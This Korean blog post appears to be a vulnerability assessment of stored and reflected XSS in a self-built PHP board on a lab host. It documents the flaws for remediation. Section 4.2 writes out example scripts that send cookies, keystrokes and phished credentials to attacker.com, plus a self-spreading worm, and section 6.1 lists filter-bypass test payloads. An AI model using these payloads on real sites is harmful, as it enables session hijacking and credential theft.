---
title: "[VAPT Report] 회원 게시판 XSS 취약점 분석 보고서"
date: 2026-01-13 2:54 +09:00
categories: [Vulnerability Report, XSS]
tags: [웹보안, 웹해킹, XSS, 크로스사이트스크립팅, VAPT]
---

## 1. Executive Summary

본 보고서는 자체 개발한 PHP 기반 회원 게시판 시스템에 대한 취약점 진단 결과를 담고 있습니다. 진단 결과, 사용자 입력값에 대한 검증 및 필터링 부재로 인해 **Stored XSS(저장형 크로스 사이트 스크립팅)** 취약점이 발견되었습니다.

### 주요 발견사항
- **취약점 유형**: Stored XSS (CWE-79)
- **위험도**: HIGH
- **CVSS v3.1 Score**: 7.1 (High)
- **영향받는 기능**: 게시판 글쓰기, 게시글 목록 조회, 게시글 상세 조회
- **발견 일자**: 2026-01-15

---

## 2. 취약점 상세 분석

### 2.1 취약점 개요

**Stored XSS(저장형 XSS)**는 공격자가 악성 스크립트를 서버에 저장한 후, 다른 사용자가 해당 페이지를 조회할 때 스크립트가 실행되는 취약점입니다. 

본 시스템에서는 게시글 작성 시 사용자 입력값(제목, 내용)을 검증 없이 데이터베이스에 저장하고, 출력 시에도 이스케이핑 처리 없이 그대로 렌더링하여 악성 스크립트 실행이 가능한 상태입니다.

### 2.2 취약점 발견 위치

| 위치 | 취약 파라미터 | 공격 벡터 |
|------|--------------|-----------|
| 게시글 제목 | `title` | Stored XSS |
| 게시글 내용 | `content` | Stored XSS |
| 검색 기능 | `search` | Reflected XSS |

---

## 3. Proof of Concept (PoC)

### 3.1 Stored XSS - 게시글 내용

**공격 시나리오**: 악성 스크립트가 포함된 게시글을 작성하여 다른 사용자의 쿠키 정보 탈취

#### Step 1: 악성 페이로드 삽입

게시글 작성 페이지에서 다음 페이로드를 내용에 입력:
```html
<script>alert(document.cookie)</script>
```

![게시글 작성](/assets/img/260115/xss2.png)
*Figure 1: 악성 스크립트가 포함된 게시글 작성*

#### Step 2: 스크립트 실행 확인

게시글 상세 페이지(member_view.php) 접근 시 자동으로 스크립트 실행:

![스크립트 실행 결과](/assets/img/260115/xss3.png)
*Figure 2: 페이지 로드 시 alert 창 실행 확인*

**실행 결과**: 
- 페이지 로드 시 즉시 JavaScript 실행
- 세션 쿠키 정보가 alert 창에 노출됨
- `PHPSESSID=7kffpla9jqpqudcbtcb1ul2som` 확인

### 3.2 Stored XSS - 게시글 제목

게시글 제목에서도 동일한 취약점 확인:
```html
<script>alert('document.cookie')</script>
```

![제목 XSS](/assets/img/260115/xss4.png)
*Figure 3: 게시글 제목을 통한 XSS 공격*

![스크립트 실행 결과](/assets/img/260115/xss5.png)
*Figure 2: 회원 게시판 페이지 로드 시 alert 창 실행 확인*

### 3.3 Reflected XSS - 검색 기능

검색 파라미터에 악성 스크립트 삽입:
```
http://192.168.56.104/logintest/member_list.php?search=<script>alert(document.cookie)</script>
```

![Reflected XSS](/assets/img/260115/xss6.png)
*Figure 4: 검색 기능을 통한 Reflected XSS*

![스크립트 실행 결과](/assets/img/260115/xss7.png)
*Figure 2: alert 창 실행 확인*

---

## 4. 영향도 분석 (Impact Assessment)

### 4.1 위험도 평가

**CVSS v3.1 Vector**: `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N`

| 항목 | 값 | 설명 |
|------|-----|------|
| Attack Vector (AV) | Network (N) | 네트워크를 통한 원격 공격 가능 |
| Attack Complexity (AC) | Low (L) | 공격 난이도 낮음 |
| Privileges Required (PR) | Low (L) | 일반 사용자 권한으로 공격 가능 |
| User Interaction (UI) | Required (R) | 피해자의 페이지 접속 필요 |
| Scope (S) | Changed (C) | 다른 사용자에게 영향 |
| Confidentiality (C) | High (H) | 세션 정보 등 민감 정보 탈취 |
| Integrity (I) | Low (L) | 페이지 변조 가능 |
| Availability (A) | None (N) | 가용성에는 영향 없음 |

**최종 점수**: **7.1 (HIGH)**

### 4.2 예상 공격 시나리오

#### 시나리오 1: 세션 하이재킹 (Session Hijacking)
```javascript
// 공격 코드 예시
<script>
var cookie = document.cookie;
fetch('http://attacker.com/steal?data=' + encodeURIComponent(cookie));
</script>
```

**공격 흐름**:
1. 공격자가 악성 스크립트가 포함된 게시글 작성
2. 피해자가 게시글 목록 또는 상세 페이지 접속
3. 스크립트 자동 실행되어 피해자의 세션 쿠키를 공격자 서버로 전송
4. 공격자는 탈취한 세션 쿠키를 이용해 피해자 계정으로 로그인

**피해 범위**:
- 피해자 계정 무단 접근
- 개인정보 열람 및 유출
- 피해자 권한으로 악의적 행위 수행

#### 시나리오 2: 키로깅 (Keylogging)
```javascript
<script>
document.addEventListener('keypress', function(e) {
    var key = String.fromCharCode(e.which);
    new Image().src = 'http://attacker.com/log?key=' + key;
});
</script>
```

**피해**:
- 사용자가 입력하는 모든 정보 실시간 탈취
- 비밀번호 변경 시도 시 새 비밀번호 유출
- 작성 중인 게시글 내용 등 민감 정보 노출

#### 시나리오 3: 피싱 공격 (Phishing)
```javascript
<script>
document.body.innerHTML = `
<div style="position:fixed; top:0; left:0; width:100%; height:100%; 
            background:white; z-index:9999; padding:50px;">
    <h2>세션이 만료되었습니다. 다시 로그인해주세요.</h2>
    <form action="http://attacker.com/phishing.php" method="POST">
        아이디: <input type="text" name="id"><br>
        비밀번호: <input type="password" name="pw"><br>
        <button>로그인</button>
    </form>
</div>`;
</script>
```

**피해**:
- 정상 사이트로 위장한 가짜 로그인 페이지 표시
- 사용자 계정 정보 직접 탈취
- 높은 성공률 (사용자는 정상 사이트에서 로그인하는 것으로 인식)

#### 시나리오 4: 웜 형태 전파 (Self-Propagating XSS Worm)
```javascript
<script>
// 현재 사용자의 권한으로 동일한 악성 게시글 자동 작성
fetch('member_insert.php', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'title=공지사항&content=<script>/* 악성코드 */</script>'
});
</script>
```

**피해**:
- 감염된 사용자가 자동으로 추가 악성 게시글 생성
- 웜(Worm)처럼 기하급수적으로 확산
- 전체 게시판이 악성 스크립트로 오염

### 4.3 비즈니스 영향도

| 영향 영역 | 심각도 | 설명 |
|-----------|--------|------|
| 사용자 개인정보 | 상 | 세션 쿠키, 입력 정보 등 탈취 가능 |
| 서비스 신뢰도 | 상 | 보안 사고 발생 시 서비스 신뢰도 급락 |
| 법적 책임 | 중 | 개인정보보호법 위반 가능성 |
| 운영 비용 | 중 | 사고 대응 및 복구 비용 발생 |

---

## 5. 보안 대책 (Remediation)

### 5.1 즉시 조치사항 (Critical)

#### 5.1.1 출력 시 HTML 이스케이핑 (필수)

**주통기 가이드 참조**: 안전하지 않은 코드 - 크로스사이트 스크립팅 (CWE-79)

모든 사용자 입력값을 출력할 때 반드시 HTML 특수문자를 이스케이핑 처리:
```php
// Before (취약)
echo $row['title'];
echo $row['content'];

// After (안전)
echo htmlspecialchars($row['title'], ENT_QUOTES, 'UTF-8');
echo htmlspecialchars($row['content'], ENT_QUOTES, 'UTF-8');
```

**적용 파일**:
- `member_list.php`: 게시글 목록 출력
- `member_view.php`: 게시글 상세 출력
- 검색 결과 출력 부분

**주통기 권고사항**:
- `htmlspecialchars()` 함수 사용 시 반드시 `ENT_QUOTES` 옵션 사용
- 문자 인코딩을 명시적으로 'UTF-8'로 지정
- 출력 컨텍스트(HTML, JavaScript, CSS 등)에 따라 적절한 이스케이핑 적용

#### 5.1.2 입력값 검증 및 필터링

**주통기 가이드**: 입력 데이터 검증 및 표현
```php
// member_insert.php 수정
$title = $_POST['title'];
$content = $_POST['content'];

// 1. 위험한 태그 제거
$allowed_tags = '<p><br><strong><em><u>'; // 허용할 태그만 지정
$title = strip_tags($title, $allowed_tags);
$content = strip_tags($content, $allowed_tags);

// 2. XSS 필터 적용
$title = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', '', $title);
$content = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', '', $content);

// 3. 이벤트 핸들러 제거
$title = preg_replace('/on\w+\s*=\s*["\'][^"\']*["\']/i', '', $title);
$content = preg_replace('/on\w+\s*=\s*["\'][^"\']*["\']/i', '', $content);

// 4. 길이 제한
$title = mb_substr($title, 0, 100, 'UTF-8');
$content = mb_substr($content, 0, 5000, 'UTF-8');
```

### 5.2 추가 보안 강화 조치 (High Priority)

#### 5.2.1 Content Security Policy (CSP) 헤더 설정

**주통기 권고**: 보안 헤더 설정을 통한 XSS 방어 강화

모든 PHP 파일 상단에 CSP 헤더 추가:
```php
<?php
// CSP 헤더 설정 - 인라인 스크립트 실행 차단
header("Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;");
?>
```

**CSP 정책 설명**:
- `default-src 'self'`: 모든 리소스는 같은 도메인에서만 로드
- `script-src 'self'`: JavaScript는 같은 도메인 파일만 실행 (인라인 스크립트 차단)
- `style-src 'self' 'unsafe-inline'`: CSS는 같은 도메인 + 인라인 스타일 허용
- `img-src 'self' data:`: 이미지는 같은 도메인 + Data URI 허용

**장점**:
- 인라인 스크립트(`<script>...</script>`) 실행 원천 차단
- 이벤트 핸들러(`onclick` 등) 실행 차단
- 외부 도메인에서 스크립트 로드 차단

#### 5.2.2 HttpOnly 및 Secure 쿠키 플래그 설정

**주통기 가이드**: 안전하지 않은 코드 - 중요정보 평문전송 (CWE-319)
```php
<?php
session_start();

// 세션 쿠키 보안 설정
ini_set('session.cookie_httponly', 1);  // JavaScript로 쿠키 접근 차단
ini_set('session.cookie_secure', 1);    // HTTPS에서만 쿠키 전송
ini_set('session.cookie_samesite', 'Strict'); // CSRF 방어
?>
```

**설정 효과**:
- `HttpOnly`: JavaScript로 `document.cookie` 접근 불가 → XSS로 쿠키 탈취 방지
- `Secure`: HTTPS 연결에서만 쿠키 전송 → 중간자 공격(MITM) 방지
- `SameSite`: 외부 사이트에서 쿠키 전송 차단 → CSRF 공격 방지

#### 5.2.3 X-XSS-Protection 헤더 설정
```php
<?php
// 브라우저 내장 XSS 필터 활성화
header("X-XSS-Protection: 1; mode=block");
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: SAMEORIGIN");
?>
```

### 5.3 장기 개선 방안 (Medium Priority)

#### 5.3.1 입력값 화이트리스트 기반 검증

**주통기 권고**: 블랙리스트가 아닌 화이트리스트 기반 검증
```php
// 허용할 HTML 태그와 속성 정의
$allowed_config = [
    'allowed_tags' => ['p', 'br', 'strong', 'em', 'u', 'a'],
    'allowed_attributes' => [
        'a' => ['href', 'title']
    ]
];

// HTML Purifier 라이브러리 사용 권장
require_once 'htmlpurifier/library/HTMLPurifier.auto.php';
$config = HTMLPurifier_Config::createDefault();
$purifier = new HTMLPurifier($config);
$clean_content = $purifier->purify($content);
```

#### 5.3.2 입력 길이 및 형식 제한
```php
// 제목: 최대 100자, 특수문자 제한
if (mb_strlen($title, 'UTF-8') > 100) {
    die("제목은 100자를 초과할 수 없습니다.");
}

// 내용: 최대 5000자
if (mb_strlen($content, 'UTF-8') > 5000) {
    die("내용은 5000자를 초과할 수 없습니다.");
}
```

#### 5.3.3 서버 측 검증 강화
```php
// 클라이언트 측 JavaScript 검증은 우회 가능하므로
// 서버 측에서 반드시 재검증 필수

function validate_input($data, $type) {
    // 1. 공백 제거
    $data = trim($data);
    
    // 2. 타입별 검증
    switch($type) {
        case 'title':
            // 제목: 특수문자 제한
            if (preg_match('/<|>|script|javascript:/i', $data)) {
                return false;
            }
            break;
        case 'content':
            // 내용: 위험한 패턴 검사
            $dangerous_patterns = [
                '/<script/i',
                '/javascript:/i',
                '/on\w+=/i',
                '/<iframe/i',
                '/<object/i',
                '/<embed/i'
            ];
            foreach ($dangerous_patterns as $pattern) {
                if (preg_match($pattern, $data)) {
                    return false;
                }
            }
            break;
    }
    
    return true;
}

// 사용 예시
if (!validate_input($title, 'title')) {
    die("유효하지 않은 제목 형식입니다.");
}
```

#### 5.3.4 보안 로깅 및 모니터링

**주통기 가이드**: 부적절한 예외 처리
```php
// 의심스러운 입력 패턴 로깅
function log_suspicious_input($user_id, $input, $field) {
    $suspicious_patterns = ['<script', 'javascript:', 'onerror='];
    
    foreach ($suspicious_patterns as $pattern) {
        if (stripos($input, $pattern) !== false) {
            // 로그 파일에 기록
            $log_msg = date('Y-m-d H:i:s') . " - User: $user_id, Field: $field, Pattern: $pattern\n";
            error_log($log_msg, 3, '/var/log/security.log');
            
            // 관리자 알림 (선택사항)
            // mail('admin@example.com', 'XSS Attempt Detected', $log_msg);
            
            return true;
        }
    }
    return false;
}
```

### 5.4 조치사항 우선순위 요약

| 우선순위 | 조치사항 | 난이도 | 예상 소요시간 |
|---------|---------|-------|--------------|
| 1 (Critical) | HTML 이스케이핑 적용 | 하 | 1시간 |
| 1 (Critical) | 입력값 필터링 | 중 | 2시간 |
| 2 (High) | CSP 헤더 설정 | 하 | 30분 |
| 2 (High) | HttpOnly 쿠키 설정 | 하 | 15분 |
| 3 (Medium) | HTML Purifier 도입 | 상 | 4시간 |
| 3 (Medium) | 보안 로깅 구현 | 중 | 2시간 |

---

## 6. 검증 방법 (Verification)

조치 완료 후 다음 방법으로 취약점 해결 여부 확인:

### 6.1 수동 테스트
```html
<!-- 테스트 페이로드 1: 기본 XSS -->
<script>alert('XSS')</script>

<!-- 테스트 페이로드 2: 이벤트 핸들러 -->
<img src=x onerror=alert('XSS')>

<!-- 테스트 페이로드 3: 대소문자 우회 시도 -->
<ScRiPt>alert('XSS')</sCrIpT>

<!-- 테스트 페이로드 4: 인코딩 우회 시도 -->
<script>alert(String.fromCharCode(88,83,83))</script>

<!-- 테스트 페이로드 5: iframe을 통한 공격 -->
<iframe src="javascript:alert('XSS')"></iframe>
```

**예상 결과**:
- ✅ 스크립트가 실행되지 않고 텍스트로 출력됨
- ✅ HTML 특수문자가 이스케이프되어 표시됨 (`<` → `&lt;`, `>` → `&gt;`)
- ✅ 브라우저 개발자 도구 콘솔에 CSP 위반 경고 표시

### 6.2 자동화 도구 검증
```bash
# OWASP ZAP을 이용한 자동 스캔
zap-cli quick-scan --self-contained \
  --start-options '-config api.disablekey=true' \
  http://192.168.56.104/logintest/

# Burp Suite Scanner 사용
# 1. Proxy를 통해 트래픽 캡처
# 2. Scanner 탭에서 Active Scan 실행
# 3. XSS 취약점 재발견 여부 확인
```

### 6.3 회귀 테스트 (Regression Test)

조치 후 정상 기능 동작 확인:
- ✅ 일반 게시글 작성/조회 정상 동작
- ✅ 한글, 영문, 특수문자 입력 정상 처리
- ✅ 검색 기능 정상 동작
- ✅ 파일 첨부 기능 정상 동작

---

## 7. 참고 자료 (References)

### 7.1 취약점 정보
- **CWE-79**: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
  - https://cwe.mitre.org/data/definitions/79.html
- **OWASP Top 10 2021**: A03:2021 - Injection
  - https://owasp.org/Top10/A03_2021-Injection/
- **OWASP XSS Prevention Cheat Sheet**
  - https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

### 7.2 주요정보통신기반시설 기술적 취약점 분석·평가 방법 상세가이드
- **행정안전부·한국인터넷진흥원 (2023)**
- 관련 항목:
  - 안전하지 않은 코드 - 크로스사이트 스크립팅 (CWE-79)
  - 입력 데이터 검증 및 표현
  - 중요정보 평문전송 (CWE-319)
  - 부적절한 예외 처리

### 7.3 보안 코딩 가이드
- **PHP 시큐어 코딩 가이드** (한국인터넷진흥원)
- **OWASP Secure Coding Practices**
  - https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/

---

## 8. 결론 (Conclusion)

본 취약점 진단을 통해 회원 게시판 시스템에서 **HIGH 등급의 Stored XSS 취약점**을 발견하였습니다. 해당 취약점은 사용자 입력값에 대한 검증 및 출력 이스케이핑 부재로 발생하였으며, 세션 하이재킹, 피싱 공격 등 심각한 보안 위협으로 이어질 수 있습니다.

**권고사항**:
1. **즉시 조치**: HTML 이스케이핑 및 입력 필터링 적용 (소요시간: 3시간)
2. **단기 조치**: CSP 헤더 및 보안 쿠키 설정 (소요시간: 1시간)
3. **장기 개선**: HTML Purifier 도입 및 보안 모니터링 강화

조치 완료 후 재진단을 통해 취약점 해결 여부를 검증하고, 정기적인 보안 점검을 통해 새로운 취약점 발생을 사전에 차단할 것을 권고합니다.

---

**Report Information**
- **작성자**: z1N
- **작성일**: 2026-01-15
- **문서버전**: 1.0
- **보안등급**: 내부용 (Internal Use Only)

---